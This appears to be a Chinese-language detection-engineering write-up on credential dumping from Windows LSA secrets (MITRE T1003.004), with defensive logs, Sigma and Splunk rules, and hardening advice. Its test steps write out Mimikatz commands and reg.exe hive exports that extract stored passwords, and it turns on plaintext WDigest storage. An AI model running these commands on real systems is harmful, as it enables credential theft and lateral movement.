# T1003.004-Win-基于LSA凭证获取

## 描述

凭据转储（Credential Dumping，MITRE ATT&CK T1003.004）涉及攻击者通过访问本地安全机构（Local Security Authority，LSA）提取凭据材料，如本地或域账户密码、服务账户凭据等。LSA机密存储于注册表`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets`或LSASS（Local Security Authority Subsystem Service，lsass.exe）进程内存中。在Windows 2000至Server 2008环境中，LSASS内存可能以明文存储密码（支持WDigest或SSP认证）。Windows 8.1及Server 2012起，微软增强了安全性，默认不再以明文存储密码，但仍可通过特定配置提取。攻击者需SYSTEM权限，可使用Mimikatz、reg.exe或pwdump7等工具从注册表或内存中提取凭据。此技术常用于横向移动或权限提升。

## 测试案例

### 测试环境
- 系统：Windows Server 2012或Windows 10（WDigest启用）
- 工具：Mimikatz、reg.exe
- 要求：SYSTEM权限、域环境（abcc.org，可选）、启用Sysmon和Windows安全日志审计
- 用户：Administrator（密码：Password123）
- 配置：启用WDigest明文存储（测试需要）

### 测试准备
1. 确认SYSTEM权限：
   ```cmd
   whoami /all
   ```
   - 确保运行于SYSTEM上下文（可通过PsExec：`psexec -s -i cmd`）。
2. 启用WDigest明文存储（Windows 8.1+需手动启用）：
   ```cmd
   reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
   ```
3. 启用日志审计：
   - 组策略：计算机配置 > 策略 > Windows设置 > 安全设置 > 本地策略 > 审核策略 > 进程跟踪、对象访问 > 启用成功和失败审计。
   - 安装Sysmon：<https://docs.microsoft.com/sysinternals/downloads/sysmon>
     - 配置：启用事件ID1（进程创建）、7（映像加载）、13（注册表操作）。
4. 下载Mimikatz：
   - URL：<https://github.com/gentilkiwi/mimikatz>
   - 放置于本地（C:\Tools\mimikatz）。
5. 确保活跃用户会话（生成LSASS凭据）。

### 测试步骤
1. **使用Mimikatz从LSASS内存提取凭据**：
   ```cmd
   cd C:\Tools\mimikatz
   mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
   ```
   - 输出示例：
     ```
     wdigest:
       * Username: Administrator
       * Domain: ABCC
       * Password: Password123
     ```
2. **使用reg.exe导出LSA机密**：
   ```cmd
   reg save HKEY_LOCAL_MACHINE\SECURITY C:\Temp\security.hiv
   ```
   - 验证文件：`dir C:\Temp\security.hiv`
3. **离线分析LSA机密**（可选）：
   - 使用Mimikatz解析：
     ```cmd
     mimikatz.exe "lsadump::secrets /system:C:\Temp\security.hiv" exit
     ```
     - 输出示例：
       ```
       * Secret: DefaultPassword
         Password: AutoLogonPass123
       ```

### 参考资源
- Mimikatz文档：<https://github.com/gentilkiwi/mimikatz>
- LSA凭据提取：<https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/>
- WDigest安全：<https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-allow-local-system-to-use-computer-identity-for-ntlm>

## 检测日志

### 数据来源
- **Sysmon日志**：
  - 事件ID1：进程创建（mimikatz.exe、reg.exe）
  - 事件ID7：映像加载（lsass.exe相关模块）
  - 事件ID13：注册表操作（HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets）
- **Windows安全日志**：
  - 事件ID4688：进程创建（mimikatz.exe、reg.exe）
  - 事件ID4673：敏感权限调用（如SeDebugPrivilege）
  - 事件ID4656：注册表访问（需启用对象访问审计）
- **文件系统**：
  - 监控`C:\Temp\`或`%temp%`的`.hiv`文件创建
- **网络流量**（可选）：
  - 捕获`.hiv`文件传输（SMB 445/TCP）

## 测试复现

### 环境配置
- 系统：Windows Server 2012（WDigest启用）
- 工具：Mimikatz、reg.exe
- 用户：Administrator（密码：Password123）
- 日志：Sysmon（事件ID1、7、13）、Windows安全日志
- 路径：C:\Temp\

### 复现步骤
1. **启用WDigest**：
   ```cmd
   reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
   ```
2. **提取LSASS凭据**：
   ```cmd
   cd C:\Tools\mimikatz
   mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
   ```
   - 输出：
     ```
     wdigest:
       * Username: Administrator
       * Domain: ABCC
       * Password: Password123
     ```
3. **导出LSA机密**：
   ```cmd
   reg save HKEY_LOCAL_MACHINE\SECURITY C:\Temp\security.hiv
   ```
   - 输出：`操作成功完成。`
4. **验证日志**：
   - Sysmon事件ID1：确认`mimikatz.exe`执行。
   - Sysmon事件ID13：确认`HKLM\SECURITY\Policy\Secrets`访问。

## 测试留痕

### Sysmon日志
- **事件ID1**：
  ```xml
  <Event>
    <EventData>
      <Data Name="Image">C:\Tools\mimikatz\mimikatz.exe</Data>
      <Data Name="CommandLine">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"</Data>
      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  ```
- **事件ID7**（lsass.exe模块加载）：
  ```xml
  <Event>
    <EventData>
      <Data Name="ImageLoaded">C:\Windows\System32\lsasrv.dll</Data>
      <Data Name="Image">C:\Tools\mimikatz\mimikatz.exe</Data>
    </EventData>
  </Event>
  ```
- **事件ID13**：
  ```xml
  <Event>
    <EventData>
      <Data Name="TargetObject">HKLM\SECURITY\Policy\Secrets</Data>
      <Data Name="Image">C:\Tools\mimikatz\mimikatz.exe</Data>
      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  ```

### Windows安全日志
- **事件ID4673**：
  ```xml
  <Event>
    <EventData>
      <Data Name="PrivilegeName">SeDebugPrivilege</Data>
      <Data Name="ProcessName">C:\Tools\mimikatz\mimikatz.exe</Data>
      <Data Name="SubjectUserName">SYSTEM</Data>
    </EventData>
  </Event>
  ```
- **事件ID4656**（需启用审计）：
  ```xml
  <Event>
    <EventData>
      <Data Name="ObjectName">\REGISTRY\MACHINE\SECURITY\Policy\Secrets</Data>
      <Data Name="ProcessName">C:\Tools\mimikatz\mimikatz.exe</Data>
      <Data Name="SubjectUserName">SYSTEM</Data>
    </EventData>
  </Event>
  ```

### 文件系统
- 文件：`C:\Temp\security.hiv`（若使用reg.exe导出）

## 检测规则/思路

### 检测方法
1. **日志监控**：
   - Sysmon事件ID1：检测`mimikatz.exe`或`reg.exe`执行。
   - Sysmon事件ID13：监控`HKLM\SECURITY\Policy\Secrets`访问。
   - Windows事件ID4673：捕获`SeDebugPrivilege`调用。
2. **文件监控**：
   - 审计`C:\Temp\`或`%temp%`的`.hiv`文件创建。
   - 监控`.hiv`文件传输。
3. **行为分析**：
   - 检测非预期SYSTEM权限进程访问LSASS或注册表。
   - 监控WDigest注册表键（`HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`）修改。
4. **网络监控**：
   - 捕获`.hiv`文件传输（SMB 445/TCP）。
5. **关联分析**：
   - 结合事件ID4688和4673，检测Mimikatz运行。
   - 监控后续凭据使用（如异常登录事件ID4624）。

### Sigma规则
#### 规则一：Mimikatz提取LSA凭据
```yaml
title: Mimikatz提取LSA凭据检测
id: p6q7r8s9-0t1u-2v3w-kx2l-9m0n1o2p3q4r
status: stable
description: 检测Mimikatz执行sekurlsa::logonpasswords提取LSA凭据
references:
  - https://attack.mitre.org/techniques/T1003/004/
tags:
  - attack.credential_access
  - attack.t1003.004
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    EventID|in:
      - 4688
      - 1
    Image|endswith: '\mimikatz.exe'
    CommandLine|contains: 'sekurlsa::logonpasswords'
  condition: selection
fields:
  - EventID
  - Image
  - CommandLine
  - User
falsepositives:
  - 安全测试工具使用
level: critical
```

#### 规则二：LSA注册表访问
```yaml
title: LSA机密注册表访问检测
id: q7r8s9t0-1u2v-3w4x-ly3m-0n1o2p3q4r5s
status: stable
description: 检测Mimikatz或reg.exe访问LSA机密注册表
references:
  - https://attack.mitre.org/techniques/T1003/004/
tags:
  - attack.credential_access
  - attack.t1003.004
logsource:
  product: windows
  category: registry_event
detection:
  selection:
    EventID: 13
    TargetObject|contains: '\SECURITY\Policy\Secrets'
    Image|endswith:
      - '\mimikatz.exe'
      - '\reg.exe'
  condition: selection
fields:
  - EventID
  - TargetObject
  - Image
  - User
falsepositives:
  - 管理员合法注册表操作
level: high
```

### Splunk规则
```spl
index=sysmon (EventCode=1 Image="*mimikatz.exe" CommandLine="*sekurlsa::logonpasswords*"
OR EventCode=13 TargetObject="*\SECURITY\Policy\Secrets*" (Image="*mimikatz.exe" OR Image="*reg.exe"))
| fields EventCode,Image,CommandLine,TargetObject,User
```

规则说明：
- 检测Mimikatz的`sekurlsa::logonpasswords`命令和LSA机密注册表访问。
- 降低误报：聚焦特定命令和注册表路径。

## 防御建议
1. **权限控制**：
   - 限制`SeDebugPrivilege`权限，仅授权必要管理员。
   - 禁止非管理员访问`HKLM\SECURITY\Policy\Secrets`。
2. **日志监控**：
   - 部署Sysmon，启用事件ID1、7、13。
   - 启用注册表审计，监控`SECURITY\Policy\Secrets`。
   - 使用SIEM关联Mimikatz和注册表事件。
3. **凭据保护**：
   - 禁用WDigest（组策略：`HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential=0`）。
   - 启用Credential Guard（Windows 10/2016+）。
   - 禁用自动登录，防止注册表存储明文密码。
4. **工具限制**：
   - 使用AppLocker限制`mimikatz.exe`和`reg.exe`非预期执行。
   - 监控第三方工具（如pwdump7）运行。
5. **主动防御**：
   - 部署诱捕凭据，监控LSASS访问。
   - 使用EDR检测Mimikatz或LSASS异常行为。

## 参考推荐
- MITRE ATT&CK T1003.004:  
  <https://attack.mitre.org/techniques/T1003/004/>
- LSA凭据提取:  
  <https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/>
- Mimikatz LSA模块:  
  <https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump>
- Pwdump7:  
  <http://passwords.openwall.net/b/pwdump/pwdump7.zip>
- WDigest安全配置:  
  <https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-allow-local-system-to-use-computer-identity-for-ntlm>
- Sysmon配置:  
  <https://github.com/SwiftOnSecurity/sysmon-config>